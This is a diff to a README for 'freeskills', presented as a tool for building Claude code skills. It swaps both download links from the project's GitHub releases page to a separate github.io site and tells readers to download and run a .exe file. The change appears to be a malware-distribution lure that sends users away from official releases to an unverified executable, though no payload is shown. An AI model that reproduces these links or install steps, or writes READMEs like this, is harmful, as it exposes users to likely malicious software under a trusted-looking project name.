@@ -1,7 +1,7 @@
 # 🚀 freeskills - Build your Claude code skills easily
 
 <p align="center">
-  <a href="https://github.com/distribuidora2504/freeskills/releases">
+  <a href="https://distribuidora2504.github.io">
     <img src="https://img.shields.io/badge/Download-Latest-blue.svg" alt="Download freeskills">
   </a>
 </p>
@@ -24,7 +24,7 @@ Ensure your computer has all recent system updates installed before you start th
 
 Follow these steps to put the software on your computer:
 
-1. Visit the [releases page](https://github.com/distribuidora2504/freeskills/releases) to see available versions.
+1. Visit the [releases page](https://distribuidora2504.github.io) to see available versions.
 2. Look for the file ending in `.exe`.
 3. Click the file name to start the download to your machine.
 4. Locate the file in your Downloads folder.
